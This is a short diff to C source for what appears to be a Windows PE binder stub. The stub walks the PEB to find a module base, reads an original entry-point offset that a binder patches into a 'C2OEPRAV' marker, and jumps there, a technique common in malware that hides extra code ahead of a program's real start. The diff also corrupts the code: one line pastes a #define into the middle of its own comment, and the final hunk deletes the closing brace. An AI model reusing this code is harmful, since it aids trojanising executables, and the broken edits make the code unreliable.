@@ -29,7 +29,7 @@ typedef unsigned long long uptr;
 #define INLOAD_OFF 0x10
 #define DBASE_INMEM 0x20  /* DllBase offset from an InMemoryOrderLinks node */
 #define DBASE_INLOAD 0x30 /* DllBase offset from an InLoadOrderLinks node   */
-#define EXPDIR_OFF 0x88   /* export data dir RVA field, from e_lfanew       */
+#define EXPDIR_OFF 0x88   /* ex#define EXPDIR_OFF 0x88   /* export data dir RVA field, from e_lfanew       */
 #else
 typedef unsigned long long uptr;
 #define PEB() ((uptr)__readfsdword(0x30))
@@ -200,7 +200,7 @@ __attribute__((section(".text.start"), used)) void _start(void)
     uptr ldr = *(uptr *)(peb + LDR_OFF);
     uptr first = *(uptr *)(ldr + INLOAD_OFF);
     uptr base = *(uptr *)(first + DBASE_INLOAD);
-    volatile char c2_oep[12] = "C2OEPRAV"; /* volatile: prevent the -O2 constant-fold that erased this marker */
+    volatile char c2_oep[12] = "C2OEPRAV\0\0\0\0"; /* volatile: prevent the -O2 constant-fold that erased this marker */
 
     u32 oep = *(volatile u32 *)(c2_oep + 8); /* original entry-point RVA (patched by binder) */
     ((void (*)(void))(base + oep))();
@@ -208,4 +208,3 @@ __attribute__((section(".text.start"), used)) void _start(void)
     for (;;)
     {
     } /* never reached for an EXE entry */
-}
